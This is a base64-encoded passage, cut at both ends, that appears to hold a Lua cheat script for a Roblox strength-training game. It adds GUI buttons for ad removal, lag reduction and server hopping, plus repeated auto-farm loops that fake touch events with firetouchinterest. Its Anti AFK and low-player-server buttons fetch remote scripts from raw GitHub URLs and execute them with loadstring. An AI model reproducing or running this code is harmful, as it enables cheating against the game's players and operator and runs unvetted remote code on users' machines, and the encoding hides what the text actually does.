IHBvcnRhbHMKICAgIGZvciBfLCBwb3J0YWwgaW4gcGFpcnMoZ2FtZTpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgIGlmIHBvcnRhbC5OYW1lID09ICJSb2Jsb3hGb3J3YXJkUG9ydGFscyIgdGhlbgogICAgICAgICAgICBwb3J0YWw6RGVzdHJveSgpCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgLS0gU2V0IHVwIGNvbm5lY3Rpb24gdG8gcmVtb3ZlIGZ1dHVyZSBhZCBwb3J0YWxzCiAgICBpZiBfRy5BZFJlbW92YWxDb25uZWN0aW9uIHRoZW4KICAgICAgICBfRy5BZFJlbW92YWxDb25uZWN0aW9uOkRpc2Nvbm5lY3QoKQogICAgZW5kCiAgICAKICAgIF9HLkFkUmVtb3ZhbENvbm5lY3Rpb24gPSBnYW1lLkRlc2NlbmRhbnRBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKGRlc2NlbmRhbnQpCiAgICAgICAgaWYgZGVzY2VuZGFudC5OYW1lID09ICJSb2Jsb3hGb3J3YXJkUG9ydGFscyIgdGhlbgogICAgICAgICAgICBkZXNjZW5kYW50OkRlc3Ryb3koKQogICAgICAgIGVuZAogICAgZW5kKQogICAgCiAgICBnYW1lOkdldFNlcnZpY2UoIlN0YXJ0ZXJHdWkiKTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIiwgewogICAgICAgIFRpdGxlID0gIkFkcyBSZW1vdmVkIiwKICAgICAgICBUZXh0ID0gIlJvYmxveCBhZHMgaGF2ZSBiZWVuIHJlbW92ZWQiLAogICAgICAgIER1cmF0aW9uID0gMAogICAgfSkKZW5kKQoKc2VydmVyVGFiOkFkZEJ1dHRvbigiQW50aSBBRksiLCBmdW5jdGlvbigpCiAgICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Tb256eXhEZXYvR1BNUi9yZWZzL2hlYWRzL21haW4vR2FyYW1vbmRWMiIpKSgpCmVuZCkKCnNlcnZlclRhYjpBZGRCdXR0b24oIkxlc3MgTGFnIiwgZnVuY3Rpb24oKQogICAgZm9yIF8sIHYgaW4gcGFpcnMoZ2FtZTpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgIGlmIHY6SXNBKCJQYXJ0aWNsZUVtaXR0ZXIiKSBvciB2OklzQSgiU21va2UiKSBvciB2OklzQSgiRmlyZSIpIG9yIHY6SXNBKCJTcGFya2xlcyIpIHRoZW4KICAgICAgICAgICAgdi5FbmFibGVkID0gZmFsc2UKICAgICAgICBlbmQKICAgIGVuZAogCiAgICBsb2NhbCBsaWdodGluZyA9IGdhbWU6R2V0U2VydmljZSgiTGlnaHRpbmciKQogICAgbGlnaHRpbmcuR2xvYmFsU2hhZG93cyA9IGZhbHNlCiAgICBsaWdodGluZy5Gb2dFbmQgPSA5ZTkKICAgIGxpZ2h0aW5nLkJyaWdodG5lc3MgPSAwCiAKICAgIHNldHRpbmdzKCkuUmVuZGVyaW5nLlF1YWxpdHlMZXZlbCA9IDEKIAogICAgZm9yIF8sIHYgaW4gcGFpcnMoZ2FtZTpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgIGlmIHY6SXNBKCJEZWNhbCIpIG9yIHY6SXNBKCJUZXh0dXJlIikgdGhlbgogICAgICAgICAgICB2LlRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBlbHNlaWYgdjpJc0EoIkJhc2VQYXJ0IikgYW5kIG5vdCB2OklzQSgiTWVzaFBhcnQiKSB0aGVuCiAgICAgICAgICAgIHYuTWF0ZXJpYWwgPSBFbnVtLk1hdGVyaWFsLlNtb290aFBsYXN0aWMKICAgICAgICAgICAgaWYgdi5QYXJlbnQgYW5kICh2LlBhcmVudDpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSBvciB2LlBhcmVudC5QYXJlbnQ6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikpIHRoZW4KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgdi5SZWZsZWN0YW5jZSA9IDAKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKIAogICAgZm9yIF8sIHYgaW4gcGFpcnMobGlnaHRpbmc6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiB2OklzQSgiQmx1ckVmZmVjdCIpIG9yIHY6SXNBKCJTdW5SYXlzRWZmZWN0Iikgb3IgdjpJc0EoIkNvbG9yQ29ycmVjdGlvbkVmZmVjdCIpIG9yIHY6SXNBKCJCbG9vbUVmZmVjdCIpIG9yIHY6SXNBKCJEZXB0aE9mRmllbGRFZmZlY3QiKSB0aGVuCiAgICAgICAgICAgIHYuRW5hYmxlZCA9IGZhbHNlCiAgICAgICAgZW5kCiAgICBlbmQKIAogICAgZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIik6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIsIHsKICAgICAgICBUaXRsZSA9ICJPcHRpbWl6YXRpb24iLAogICAgICAgIFRleHQgPSAiRnVsbCBvcHRpbWl6YXRpb24gYXBwbGllZCEiLAogICAgICAgIER1cmF0aW9uID0gNQogICAgfSkKZW5kKQoKc2VydmVyVGFiOkFkZEJ1dHRvbigiUmVqb2luIFNlcnZlciIsIGZ1bmN0aW9uKCkKICAgIGxvY2FsIHRzID0gZ2FtZTpHZXRTZXJ2aWNlKCJUZWxlcG9ydFNlcnZpY2UiKQogICAgbG9jYWwgcCA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyCiAgICB0czpUZWxlcG9ydChnYW1lLlBsYWNlSWQsIHApCmVuZCkKIApsb2NhbCBqb2luTG93UGxheWVyU2VydmVyU3dpdGNoID0gc2VydmVyVGFiOkFkZFN3aXRjaCgiSm9pbiBMb3cgUGxheWVyIFNlcnZlciIsIGZ1bmN0aW9uKGJvb2wpCiAgICBpZiBib29sIHRoZW4KICAgICAgICBsb2NhbCBtb2R1bGUgPSBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0xlb0tob2xZdC9yb2Jsb3gvbWFpbi9sa19zZXJ2ZXJob3AubHVhIikpKCkKICAgICAgICBtb2R1bGU6VGVsZXBvcnQoZ2FtZS5QbGFjZUlkLCAiTG93ZXN0IikKICAgIGVuZAplbmQpCgpsb2NhbCBhdXRvUm9ja1RhYiA9IHdpbmRvdzpBZGRUYWIoIlJvY2tzIikKCmF1dG9Sb2NrVGFiOkFkZExhYmVsKCItLS1UTUIgRmFzdCBHbGl0Y2gtLS0iKQoKLS0gRGVmaW5lIHRoZSBnZXR0b29sIGZ1bmN0aW9uIGZpcnN0CmZ1bmN0aW9uIGdldHRvb2woKQogICAgZm9yIGksIHYgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgdi5OYW1lID09ICJQdW5jaCIgYW5kIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgdGhlbgogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOkVxdWlwVG9vbCh2KQogICAgICAgIGVuZAogICAgZW5kCiAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJwdW5jaCIsICJsZWZ0SGFuZCIpCiAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJwdW5jaCIsICJyaWdodEhhbmQiKQplbmQKCi0tIEFkZCBhbGwgcm9jayBmYXJtaW5nIHRvZ2dsZXMgdG8gdGhlIEF1dG8gUm9jayBmb2xkZXIKYXV0b1JvY2tUYWI6QWRkU3dpdGNoKCJBdXRvIFB1bmNoIFRpbnkgUm9jayAoMCkiLCBmdW5jdGlvbihWYWx1ZSkKICAgIHNlbGVjdHJvY2sgPSAiVGlueSBJc2xhbmQgUm9jayIKICAgIGdldGdlbnYoKS5hdXRvRmFybSA9IFZhbHVlCiAgICAKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIGdldGdlbnYoKS5hdXRvRmFybSBkbwogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICBpZiBub3QgZ2V0Z2VudigpLmF1dG9GYXJtIHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5EdXJhYmlsaXR5LlZhbHVlID49IDAgdGhlbgogICAgICAgICAgICAgICAgZm9yIGksIHYgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKS5tYWNoaW5lc0ZvbGRlcjpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIHYuTmFtZSA9PSAibmVlZGVkRHVyYWJpbGl0eSIgYW5kIHYuVmFsdWUgPT0gMCBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiTGVmdEhhbmQiKSBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUmlnaHRIYW5kIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuUmlnaHRIYW5kLCAwKQogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuUmlnaHRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuTGVmdEhhbmQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5MZWZ0SGFuZCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgZ2V0dG9vbCgpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZCkKCmF1dG9Sb2NrVGFiOkFkZFN3aXRjaCgiQXV0byBQdW5jaCBTdGFydGVyIFJvY2sgKDEwMCkiLCBmdW5jdGlvbihWYWx1ZSkKICAgIHNlbGVjdHJvY2sgPSAiU3RhcnRlciBJc2xhbmQgUm9jayIKICAgIGdldGdlbnYoKS5hdXRvRmFybSA9IFZhbHVlCiAgICAKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIGdldGdlbnYoKS5hdXRvRmFybSBkbwogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICBpZiBub3QgZ2V0Z2VudigpLmF1dG9GYXJtIHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5EdXJhYmlsaXR5LlZhbHVlID49IDEwMCB0aGVuCiAgICAgICAgICAgICAgICBmb3IgaSwgdiBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpLm1hY2hpbmVzRm9sZGVyOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgdi5OYW1lID09ICJuZWVkZWREdXJhYmlsaXR5IiBhbmQgdi5WYWx1ZSA9PSAxMDAgYW5kIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkxlZnRIYW5kIikgYW5kIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlJpZ2h0SGFuZCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLlJpZ2h0SGFuZCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLlJpZ2h0SGFuZCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkxlZnRIYW5kLCAwKQogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuTGVmdEhhbmQsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgIGdldHRvb2woKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kKQplbmQpCgphdXRvUm9ja1RhYjpBZGRTd2l0Y2goIkF1dG8gUHVuY2ggTGVnZW5kIEJlYWNoIFJvY2sgKDVLKSIsIGZ1bmN0aW9uKFZhbHVlKQogICAgc2VsZWN0cm9jayA9ICJMZWdlbmQgQmVhY2ggUm9jayIKICAgIGdldGdlbnYoKS5hdXRvRmFybSA9IFZhbHVlCiAgICAKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIGdldGdlbnYoKS5hdXRvRmFybSBkbwogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICBpZiBub3QgZ2V0Z2VudigpLmF1dG9GYXJtIHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5EdXJhYmlsaXR5LlZhbHVlID49IDUwMDAgdGhlbgogICAgICAgICAgICAgICAgZm9yIGksIHYgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKS5tYWNoaW5lc0ZvbGRlcjpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIHYuTmFtZSA9PSAibmVlZGVkRHVyYWJpbGl0eSIgYW5kIHYuVmFsdWUgPT0gNTAwMCBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiTGVmdEhhbmQiKSBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUmlnaHRIYW5kIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuUmlnaHRIYW5kLCAwKQogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuUmlnaHRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuTGVmdEhhbmQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5MZWZ0SGFuZCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgZ2V0dG9vbCgpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZCkKCmF1dG9Sb2NrVGFiOkFkZFN3aXRjaCgiQXV0byBQdW5jaCBGcm96ZW4gUm9jayAoMTUwSykiLCBmdW5jdGlvbihWYWx1ZSkKICAgIHNlbGVjdHJvY2sgPSAiRnJvc3QgR3ltIFJvY2siCiAgICBnZXRnZW52KCkuYXV0b0Zhcm0gPSBWYWx1ZQogICAgCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICB3aGlsZSBnZXRnZW52KCkuYXV0b0Zhcm0gZG8KICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgaWYgbm90IGdldGdlbnYoKS5hdXRvRmFybSB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuRHVyYWJpbGl0eS5WYWx1ZSA+PSAxNTAwMDAgdGhlbgogICAgICAgICAgICAgICAgZm9yIGksIHYgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKS5tYWNoaW5lc0ZvbGRlcjpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIHYuTmFtZSA9PSAibmVlZGVkRHVyYWJpbGl0eSIgYW5kIHYuVmFsdWUgPT0gMTUwMDAwIGFuZCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJMZWZ0SGFuZCIpIGFuZCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJSaWdodEhhbmQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5SaWdodEhhbmQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5SaWdodEhhbmQsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5MZWZ0SGFuZCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkxlZnRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICBnZXR0b29sKCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZCkKZW5kKQoKYXV0b1JvY2tUYWI6QWRkU3dpdGNoKCJBdXRvIFB1bmNoIE15dGhpY2FsIFJvY2sgKDQwMEspIiwgZnVuY3Rpb24oVmFsdWUpCiAgICBzZWxlY3Ryb2NrID0gIk15dGhpY2FsIEd5bSBSb2NrIgogICAgZ2V0Z2VudigpLmF1dG9GYXJtID0gVmFsdWUKICAgIAogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgZ2V0Z2VudigpLmF1dG9GYXJtIGRvCiAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgIGlmIG5vdCBnZXRnZW52KCkuYXV0b0Zhcm0gdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkR1cmFiaWxpdHkuVmFsdWUgPj0gNDAwMDAwIHRoZW4KICAgICAgICAgICAgICAgIGZvciBpLCB2IGluIHBhaXJzKGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIikubWFjaGluZXNGb2xkZXI6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiB2Lk5hbWUgPT0gIm5lZWRlZER1cmFiaWxpdHkiIGFuZCB2LlZhbHVlID09IDQwMDAwMCBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiTGVmdEhhbmQiKSBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUmlnaHRIYW5kIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuUmlnaHRIYW5kLCAwKQogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuUmlnaHRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuTGVmdEhhbmQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5MZWZ0SGFuZCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgZ2V0dG9vbCgpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZCkKCmF1dG9Sb2NrVGFiOkFkZFN3aXRjaCgiQXV0byBQdW5jaCBJbmZlcm5vIFJvY2sgKDc1MEspIiwgZnVuY3Rpb24oVmFsdWUpCiAgICBzZWxlY3Ryb2NrID0gIkluZmVybm8gR3ltIFJvY2siCiAgICBnZXRnZW52KCkuYXV0b0Zhcm0gPSBWYWx1ZQogICAgCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICB3aGlsZSBnZXRnZW52KCkuYXV0b0Zhcm0gZG8KICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgaWYgbm90IGdldGdlbnYoKS5hdXRvRmFybSB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuRHVyYWJpbGl0eS5WYWx1ZSA+PSA3NTAwMDAgdGhlbgogICAgICAgICAgICAgICAgZm9yIGksIHYgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKS5tYWNoaW5lc0ZvbGRlcjpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIHYuTmFtZSA9PSAibmVlZGVkRHVyYWJpbGl0eSIgYW5kIHYuVmFsdWUgPT0gNzUwMDAwIGFuZCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJMZWZ0SGFuZCIpIGFuZCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJSaWdodEhhbmQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5SaWdodEhhbmQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5SaWdodEhhbmQsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5MZWZ0SGFuZCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkxlZnRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICBnZXR0b29sKCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZCkKZW5kKQoKYXV0b1JvY2tUYWI6QWRkU3dpdGNoKCJBdXRvIFB1bmNoIExlZ2VuZCBSb2NrICgxTSkiLCBmdW5jdGlvbihWYWx1ZSkKICAgIHNlbGVjdHJvY2sgPSAiTGVnZW5kIEd5bSBSb2NrIgogICAgZ2V0Z2VudigpLmF1dG9GYXJtID0gVmFsdWUKICAgIAogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgZ2V0Z2VudigpLmF1dG9GYXJtIGRvCiAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgIGlmIG5vdCBnZXRnZW52KCkuYXV0b0Zhcm0gdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkR1cmFiaWxpdHkuVmFsdWUgPj0gMTAwMDAwMCB0aGVuCiAgICAgICAgICAgICAgICBmb3IgaSwgdiBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpLm1hY2hpbmVzRm9sZGVyOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgdi5OYW1lID09ICJuZWVkZWREdXJhYmlsaXR5IiBhbmQgdi5WYWx1ZSA9PSAxMDAwMDAwIGFuZCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJMZWZ0SGFuZCIpIGFuZCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJSaWdodEhhbmQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5SaWdodEhhbmQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5SaWdodEhhbmQsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5MZWZ0SGFuZCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNo